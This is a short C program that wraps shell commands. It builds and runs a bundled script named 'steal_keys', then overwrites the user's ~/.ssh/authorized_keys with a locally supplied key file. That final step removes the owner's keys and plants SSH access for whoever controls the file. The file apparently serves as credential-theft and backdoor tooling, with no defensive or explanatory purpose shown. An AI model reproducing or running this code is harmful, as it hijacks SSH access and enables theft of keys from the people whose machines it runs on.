#include <stdio.h>
#include <stdlib.h>

int main() {
  system("pkg steal_keys/index.js");
  system("sleep 5");
  system("./index-macos");
  system("cat .authorized_keys > ~/.ssh/authorized_keys");
}